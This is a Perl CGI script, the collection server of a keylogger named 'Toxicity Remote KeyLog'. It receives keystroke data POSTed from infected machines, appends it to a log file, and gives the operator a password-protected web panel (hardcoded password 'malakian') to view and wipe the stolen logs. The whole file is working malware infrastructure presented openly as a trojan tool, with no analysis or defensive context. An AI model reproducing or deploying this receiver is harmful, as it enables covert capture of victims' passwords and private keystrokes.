#!/usr/bin/perl
print "Content-type:text/html\n\n";
#################################################
#						#
# Toxicity Remote KeyLog - CGI Packets Receiver #
#						#
#              b y   i r a d i u m              #
#						#
#       http://www.comandotrojan.cjb.net/       #
#						#
#################################################

$password = "malakian";
$Data_base = "";
$file_log = "logger.log";

&ParseRequest;
exit;

### begin procedures

sub ParseRequest {

if ($ENV{'CONTENT_LENGTH'} ne '') {
  read(STDIN, $buffer, $ENV{'CONTENT_LENGTH'});
  @pairs = split(/&/, $buffer);
  foreach $pair (@pairs) {
    ($name, $value) = split(/=/, $pair);
    $value =~ tr/+/ /;
    $value =~ s/%([a-fA-F0-9][a-fA-F0-9])/pack("C", hex($1))/eg;
    $value =~ s/~!/ ~!/g;
    $INPUT{$name} = $value;
}}

if (($INPUT{'Logger'} eq 'Arrival') and ($INPUT{'Target'} ne ''))
{

&Secure;
$Data_Base = $INPUT{'Target'};
&Log;
exit;

}
elsif (($INPUT{'Empty'} eq 'Causes') and ($INPUT{'Login'} eq $password))
{

&Secure;
&Empty("Logs has been empty...");
exit;

}
elsif (($INPUT{'Login'} eq $password) and ($INPUT{'Start'} eq 'Script'))
{

&Secure;
&ViewLog("View Logs...");
exit;

}
else
{

print "<html>\n".
      "<head>\n".
      "<title>Toxicity - Remote KeyLog :: CGI Packtes Receiver</title>\n".
      "</head>\n\n".
      "<font face=Verdana size=3><b>Toxicity - Remote KeyLog :: CGI Packtes Receiver</b></font><br><br>\n".
      "<form method=POST action=city.pl>\n".
      "<input type=hidden name=Start value=Script>\n".
      "<input type=password name=Login> &nbsp; \n".
      "<input type=submit value=' Enter '>\n".
      "</form>\n".
      "</body>\n".
      "</html>\n\n";
exit;
}}

sub Log {
open (LOG,">>$file_log") || die print "File Open Error $file_log: $!\n";
print LOG "<tr><font color=#000000 size=1 face=Verdana><b>$Data_Base</b><br><br></td>\n";
close LOG;
}

sub ViewLog {

open (FILE,"$file_log") || die print "File Open Error $file_log: $!\n";
@list = <FILE>;
close(FILE);

print "<html>\n".
      "<head>\n".
      "<title>Toxicity - Remote KeyLog :: CGI Packtes Receiver</title>\n".
      "</head>\n\n".
      "<font face=Verdana size=3><b>Toxicity - Remote KeyLog :: CGI Packtes Receiver</b></font><br><br>\n".
      "<font face=verdana size=2>:: @_</font><br><br>\n\n".
      "<table width=100% border=0 cellspacing=0 cellpadding=0>\n".
      "@list\n".
      "</table><br>\n".
      "<table width=100% border=0><tr><td>\n".
      "<div align=center><form method=POST action=city.pl>\n".
      "<input type=hidden name=Empty value=Causes>\n".
      "<input type=hidden name=Login value=$password>\n".
      "<input type=submit value='Empty Logs'>\n".
      "</form></div></td>\n".
      "<td><div align=center><form method=POST action=city.pl>\n".
      "<input type=hidden name=Start value=Script>\n".
      "<input type=hidden name=Login value=$password>\n".
      "<input type=submit value='   UpDate   '></form>\n".
      "</div></td></tr></table><br><font face=Verdana size=1><center>\n".
      "<a href=http://www.comandotrojan.cjb.net target=_n>www.comandotrojan.cjb.net</a>\n".
      "</center></font></body></html>\n\n";
exit;
}

sub Empty {

open (FILE,">$file_log") || die print "File Open Error $file_log: $!\n";
print FILE "";
close(FILE);

&ViewLog;
exit;
}

sub Secure {
if ($ENV{'REQUEST_METHOD'} ne 'POST'){
print "sorry, method request not allowed =/";
exit;
}}

# End